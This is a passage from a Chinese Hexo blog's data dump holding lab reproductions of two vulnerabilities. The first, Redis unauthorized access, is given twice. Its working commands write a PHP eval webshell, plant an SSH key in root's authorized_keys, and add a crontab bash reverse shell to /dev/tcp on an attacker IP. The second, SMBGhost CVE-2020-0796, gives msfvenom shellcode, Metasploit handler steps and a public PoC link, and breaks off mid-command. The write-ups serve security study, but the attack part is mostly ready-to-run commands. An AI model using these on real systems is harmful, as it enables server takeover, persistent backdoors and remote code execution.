\n\n","slug":"漏洞复现-Redis未授权访问","published":1,"updated":"2021-08-07T16:21:39.103Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpfn001evkq3h2i9a3sa","content":"<h1 id=\"Redis概念\"><a href=\"#Redis概念\" class=\"headerlink\" title=\"Redis概念\"></a>Redis概念</h1><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>\n<p>Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。</p>\n<span id=\"more\"></span>\n\n<h1 id=\"Redis未授权访问\"><a href=\"#Redis未授权访问\" class=\"headerlink\" title=\"Redis未授权访问\"></a>Redis未授权访问</h1><p>redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。</p>\n<p>漏洞产生条件    </p>\n<blockquote>\n<p>1、    redis服务绑定在6379端口并且该端口可以被访问到<br>2、    没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p>\n</blockquote>\n<h1 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h1><p>靶机：<br>Centos7：192.168.229.157<br><img src=\"/images/14/1.png\" alt=\"upload successful\"><br>攻击机：<br>Kali：192.168.229.128<br><img src=\"/images/14/2.png\" alt=\"upload successful\">  </p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>1、首先下载redis的压缩包    </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/3.png\" alt=\"upload successful\"> </p>\n<p>2、解压压缩包，进入指定路径redis-2.8.17，进行安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar xzf redis-2.8.17.tar.gz</span><br><span class=\"line\">cd redis-2.8.17</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/4.png\" alt=\"upload successful\"> </p>\n<p>3、进入到src路径，将redis-server和redis-cli拷贝到/usr/bin目录下，后续方便直接启动redis服务器并且将redis-2.8.17目录下面的redis.conf拷贝到/etc下面。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd src</span><br><span class=\"line\">cp redis-server /usr/bin</span><br><span class=\"line\">cp redis-cli /usr/bin</span><br><span class=\"line\">cp redis.conf /etc/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/5.png\" alt=\"upload successful\"> </p>\n<p>4、启动服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/6.png\" alt=\"upload successful\"> </p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><h2 id=\"写入webshell\"><a href=\"#写入webshell\" class=\"headerlink\" title=\"写入webshell\"></a>写入webshell</h2><p>1、首先尝试无密码连接redis，未报错表示连接成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h 192.168.229.157</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/7.png\" alt=\"upload successful\"> </p>\n<p>2、写入webhsell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h 192.168.229.157</span><br><span class=\"line\">config set dir /home/</span><br><span class=\"line\">config set dbfilename 8.php</span><br><span class=\"line\">set webshell &quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/8.png\" alt=\"upload successful\"> </p>\n<p>3、在服务器查看文件，确实写入了webshell<br><img src=\"/images/14/9.png\" alt=\"upload successful\"> </p>\n<h2 id=\"利用“公私钥”认证获得root权限\"><a href=\"#利用“公私钥”认证获得root权限\" class=\"headerlink\" title=\"利用“公私钥”认证获得root权限\"></a>利用“公私钥”认证获得root权限</h2><p>1、 kali攻击机未授权访问连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h 192.168.163.157</span><br><span class=\"line\">keys *</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/14/10.png\" alt=\"upload successful\"> </p>\n<p>2、在攻击机中生成ssh公钥和私钥，密码设置为空（一路回车即可）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/11.png\" alt=\"upload successful\"> </p>\n<p>3、进入.ssh目录，将生成的公钥保存到1.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /root/.ssh</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/12.png\" alt=\"upload successful\"> </p>\n<p>4、将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat 1.txt | redis-cli -h 192.168.229.157 -x set crack</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/13.png\" alt=\"upload successful\"> </p>\n<p>5、使用 CONFIG GET dir 命令得到redis备份的路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONFIG GET dir</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/14.png\" alt=\"upload successful\"> </p>\n<p>6、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,并且修改上传公钥文件的名称为authorized_keys。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">  这里设置目录时，可能存在(error) ERR Changing directory: No such file or directory</span><br><span class=\"line\">  这是因为root从来没有登录过，在被攻击机执行ssh localhost 即可</span><br><span class=\"line\">  (error) ERR Changing directory: Permission denied</span><br><span class=\"line\">  说明redis并不是以root启动的，在被攻击机重新使用sudo开启redis服务即可</span><br><span class=\"line\">CONFIG SET dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/15.png\" alt=\"upload successful\"> </p>\n<p>查看攻击机也已经成功生成了公钥文件<br><img src=\"/images/14/16.png\" alt=\"upload successful\"> </p>\n<p>7、使用ssh免密码登录redis服务器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i id_rsa root@192.168.229.157</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/17.png\" alt=\"upload successful\"> </p>\n<h2 id=\"利用计划任务反弹shell\"><a href=\"#利用计划任务反弹shell\" class=\"headerlink\" title=\"利用计划任务反弹shell\"></a>利用计划任务反弹shell</h2><p>1、首先kali机器进行开启监听<br><img src=\"/images/14/18.png\" alt=\"upload successful\"> </p>\n<p>2、使用redis通过crontab进行反弹shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.229.128/4455 0&gt;&amp;1\\n\\n&quot;</span><br><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">config set dbfilename root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/19.png\" alt=\"upload successful\"> </p>\n<p>3、查看反弹shell命令已经成功写入了<br><img src=\"/images/14/20.png\" alt=\"upload successful\"> </p>\n<p>4、攻击机也成功获取了shell<br><img src=\"/images/14/21.png\" alt=\"upload successful\"> </p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"<h1 id=\"Redis概念\"><a href=\"#Redis概念\" class=\"headerlink\" title=\"Redis概念\"></a>Redis概念</h1><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p>\n<p>Redis 是一个高性能的key-value数据库。 redis的出现，很大程度补偿了memcached这类key/value存储的不足，在部 分场合可以对关系数据库起到很好的补充作用。它提供了Java，C/C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。</p>","more":"<h1 id=\"Redis未授权访问\"><a href=\"#Redis未授权访问\" class=\"headerlink\" title=\"Redis未授权访问\"></a>Redis未授权访问</h1><p>redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作。</p>\n<p>漏洞产生条件    </p>\n<blockquote>\n<p>1、    redis服务绑定在6379端口并且该端口可以被访问到<br>2、    没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p>\n</blockquote>\n<h1 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h1><p>靶机：<br>Centos7：192.168.229.157<br><img src=\"/images/14/1.png\" alt=\"upload successful\"><br>攻击机：<br>Kali：192.168.229.128<br><img src=\"/images/14/2.png\" alt=\"upload successful\">  </p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>1、首先下载redis的压缩包    </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/3.png\" alt=\"upload successful\"> </p>\n<p>2、解压压缩包，进入指定路径redis-2.8.17，进行安装</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tar xzf redis-2.8.17.tar.gz</span><br><span class=\"line\">cd redis-2.8.17</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/4.png\" alt=\"upload successful\"> </p>\n<p>3、进入到src路径，将redis-server和redis-cli拷贝到/usr/bin目录下，后续方便直接启动redis服务器并且将redis-2.8.17目录下面的redis.conf拷贝到/etc下面。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd src</span><br><span class=\"line\">cp redis-server /usr/bin</span><br><span class=\"line\">cp redis-cli /usr/bin</span><br><span class=\"line\">cp redis.conf /etc/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/5.png\" alt=\"upload successful\"> </p>\n<p>4、启动服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/6.png\" alt=\"upload successful\"> </p>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><h2 id=\"写入webshell\"><a href=\"#写入webshell\" class=\"headerlink\" title=\"写入webshell\"></a>写入webshell</h2><p>1、首先尝试无密码连接redis，未报错表示连接成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h 192.168.229.157</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/7.png\" alt=\"upload successful\"> </p>\n<p>2、写入webhsell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h 192.168.229.157</span><br><span class=\"line\">config set dir /home/</span><br><span class=\"line\">config set dbfilename 8.php</span><br><span class=\"line\">set webshell &quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/8.png\" alt=\"upload successful\"> </p>\n<p>3、在服务器查看文件，确实写入了webshell<br><img src=\"/images/14/9.png\" alt=\"upload successful\"> </p>\n<h2 id=\"利用“公私钥”认证获得root权限\"><a href=\"#利用“公私钥”认证获得root权限\" class=\"headerlink\" title=\"利用“公私钥”认证获得root权限\"></a>利用“公私钥”认证获得root权限</h2><p>1、 kali攻击机未授权访问连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">redis-cli -h 192.168.163.157</span><br><span class=\"line\">keys *</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/14/10.png\" alt=\"upload successful\"> </p>\n<p>2、在攻击机中生成ssh公钥和私钥，密码设置为空（一路回车即可）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/11.png\" alt=\"upload successful\"> </p>\n<p>3、进入.ssh目录，将生成的公钥保存到1.txt</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /root/.ssh</span><br><span class=\"line\">(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; 1.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/12.png\" alt=\"upload successful\"> </p>\n<p>4、将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat 1.txt | redis-cli -h 192.168.229.157 -x set crack</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/13.png\" alt=\"upload successful\"> </p>\n<p>5、使用 CONFIG GET dir 命令得到redis备份的路径</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONFIG GET dir</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/14.png\" alt=\"upload successful\"> </p>\n<p>6、更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）,并且修改上传公钥文件的名称为authorized_keys。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">config set dir /root/.ssh</span><br><span class=\"line\">  这里设置目录时，可能存在(error) ERR Changing directory: No such file or directory</span><br><span class=\"line\">  这是因为root从来没有登录过，在被攻击机执行ssh localhost 即可</span><br><span class=\"line\">  (error) ERR Changing directory: Permission denied</span><br><span class=\"line\">  说明redis并不是以root启动的，在被攻击机重新使用sudo开启redis服务即可</span><br><span class=\"line\">CONFIG SET dbfilename authorized_keys</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/15.png\" alt=\"upload successful\"> </p>\n<p>查看攻击机也已经成功生成了公钥文件<br><img src=\"/images/14/16.png\" alt=\"upload successful\"> </p>\n<p>7、使用ssh免密码登录redis服务器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh -i id_rsa root@192.168.229.157</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/17.png\" alt=\"upload successful\"> </p>\n<h2 id=\"利用计划任务反弹shell\"><a href=\"#利用计划任务反弹shell\" class=\"headerlink\" title=\"利用计划任务反弹shell\"></a>利用计划任务反弹shell</h2><p>1、首先kali机器进行开启监听<br><img src=\"/images/14/18.png\" alt=\"upload successful\"> </p>\n<p>2、使用redis通过crontab进行反弹shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xxx &quot;\\n\\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.229.128/4455 0&gt;&amp;1\\n\\n&quot;</span><br><span class=\"line\">config set dir /var/spool/cron</span><br><span class=\"line\">config set dbfilename root</span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n<p><img src=\"/images/14/19.png\" alt=\"upload successful\"> </p>\n<p>3、查看反弹shell命令已经成功写入了<br><img src=\"/images/14/20.png\" alt=\"upload successful\"> </p>\n<p>4、攻击机也成功获取了shell<br><img src=\"/images/14/21.png\" alt=\"upload successful\"> </p>"},{"title":"漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）","keywords":"系统安全,SMB,远程代码执行,漏洞复现","description":"漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）.md","cover":"https://img2.baidu.com/it/u=207705934,1439123695&fm=26&fmt=auto&gp=0.jpg","date":"2021-07-02T14:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## 环境搭建\n\n虚拟机wmware\nWindows10\n下载地址：\n迅雷下载 ：\ned2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|\n\n## 漏洞概述\nSMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。\n攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。\n该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击SMB服务端造成RCE外，该漏洞得亮点在于对SMB客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE文档等多种方式触发漏洞进行攻击。\n## 漏洞影响\n漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。\nWindows 10 Version 1903 for 32-bit Systems\nWindows 10 Version 1903 for x64-based Systems\nWindows 10 Version 1903 for ARM64-based Systems\nWindows Server, Version 1903 (Server Core installation)\nWindows 10 Version 1909 for 32-bit Systems\nWindows 10 Version 1909 for x64-based Systems\nWindows 10 Version 1909 for ARM64-based Systems\nWindows Server, Version 1909 (Server Core installation)\n## 漏洞检测\n#### 测试是否能ping通靶机\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334566921-50d4d448-988a-485c-a60f-e55470131666.png)\n如果ping不通，可能情况是靶机开启了防护墙Windows defender，可以手动进行关闭\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567523-b4c59e2c-b836-42e7-bba5-a8b2250d1bac.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&originHeight=888&originWidth=1578&status=done&style=none&width=415)\n\n#### 检测漏洞存在\n使用exp检测漏洞存在\n下载地址：\n[http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip](http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip)\n使用方法：\n下载后使用CVE-2020-0796-Scanner.exe，输入ip地址即可\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567969-a968efd6-ec6e-4098-8450-253287c8347d.png#align=left&display=inline&height=59&margin=%5Bobject%2Object%5D&originHeight=170&originWidth=1196&status=done&style=none&width=415)\n## 漏洞利用\n1、通过 MSF 生成 shellcode：\nmsfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o shellcode.txt\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334568518-bf92759e-47dc-4baf-aa81-34b93d062fb5.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=904&status=done&style=none&width=415)\n2、通过exp利用脚本利用shellcode\n下载地址：\n[https://github.com/chompie1337/SMBGhost_RCE_PoC.git](https://github.com/chompie1337/SMBGhost_RCE_PoC.git)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569014-643b6bf8-1e45-4460-b2ca-73a429003a20.png#align=left&display=inline&height=135&margin=%5Bobject%2Object%5D&originHeight=274&originWidth=840&status=done&style=none&width=415)\n3、将生成的shellcode的内容中的buf替换成USER_PAYLOAD\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334569620-761f2972-b589-41e2-a758-254b9602efd6.png#align=left&display=inline&height=193&margin=%5Bobject%2Object%5D&originHeight=880&originWidth=1891&status=done&style=none&width=415)\n4、替换exploit.py中的USER_PAYLOAD的内容\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570095-2198b1d8-4fc8-4ca7-a05b-51586636e251.png#align=left&display=inline&height=199&margin=%5Bobject%2Object%5D&originHeight=918&originWidth=1920&status=done&style=none&width=416)\n5、msf开启监听\nmsfconsole\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/bind_tcp\nset lport 9999\nset rhost 192.168.229.166\nexploit\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570644-dbf6a715-ac0b-4bf2-9829-d1d26e4abd67.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=203&originWidth=703&status=done&style=none&width=415)\n6、在靶机执行exploit.py脚本\npython3 exploit.py -ip 192.168.229.166\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334570993-a6fdfee2-18d7-459b-9c7b-258055be8e28.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&originHeight=96&originWidth=531&status=done&style=none&width=319)\n然后，成功蓝屏。。。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334571514-1b5042a8-4fd1-40b2-a3fa-6ff187bcfc6b.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&originHeight=480&originWidth=640&status=done&style=none&width=384)\n","source":"_posts/漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）.md","raw":"---\ntitle: 漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）\ntags: \n  - SMB\n  - 系统安全\n  - 远程代码执行\ncategories: 漏洞复现\nkeywords: '系统安全,SMB,远程代码执行,漏洞复现'\ndescription: 漏洞复现-SMB远程代码执行漏洞（CVE-2020-0796）.md\ncover: https://img2.baidu.com/it/u=207705934,1439123695&fm=26&fmt=auto&gp=0.jpg\ndate: 2021-07-02 22:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## 环境搭建\n\n虚拟机wmware\nWindows10\n下载地址：\n迅雷下载 ：\ned2k://|file|cn_windows_10_business_editions_version_1903_x64_dvd_e001dd2c.iso|4815527936|47D4C57E638DF8BF74C59261E2CE702D|\n\n## 漏洞概述\nSMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。\n攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。\n该漏洞的后果十分接近永恒之蓝系列，都利用Windows SMB漏洞远程攻击获取系统最高权限，WannaCry勒索蠕虫就是利用永恒之蓝系列漏洞攻击工具制造的大灾难。除了直接攻击SMB服务端造成RCE外，该漏洞得亮点在于对SMB客户端的攻击，攻击者可以构造特定的网页，压缩包，共享目录，OFFICE文档等多种方式触发漏洞进行攻击。\n## 漏洞影响\n漏洞不影响win7，漏洞影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。\nWindows 10 Version 1903 for 32-bit Systems\nWindows 10 Version 1903 for x64-based Systems\nWindows 10 Version 1903 for ARM64-based Systems\nWindows Server, Version 1903 (Server Core installation)\nWindows 10 Version 1909 for 32-bit Systems\nWindows 10 Version 1909 for x64-based Systems\nWindows 10 Version 1909 for ARM64-based Systems\nWindows Server, Version 1909 (Server Core installation)\n## 漏洞检测\n#### 测试是否能ping通靶机\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334566921-50d4d448-988a-485c-a60f-e55470131666.png)\n如果ping不通，可能情况是靶机开启了防护墙Windows defender，可以手动进行关闭\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567523-b4c59e2c-b836-42e7-bba5-a8b2250d1bac.png#align=left&display=inline&height=234&margin=%5Bobject%2Object%5D&originHeight=888&originWidth=1578&status=done&style=none&width=415)\n\n#### 检测漏洞存在\n使用exp检测漏洞存在\n下载地址：\n[http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip](http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip)\n使用方法：\n下载后使用CVE-2020-0796-Scanner.exe，输入ip地址即可\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612334567969-a968efd6-ec6e-4098-8450-253287c8347d.png#align=left&display=inline&height=59&margin=%5Bobject%2Object%5D&originHeight=170&originWidth=1196&status=done&style=none&width=415)\n## 漏洞利用\n1、通过 MSF 生成 shellcode：\nmsfvenom -p windows/x64/meterpreter/bind_tcp lport=9999 -f py -o 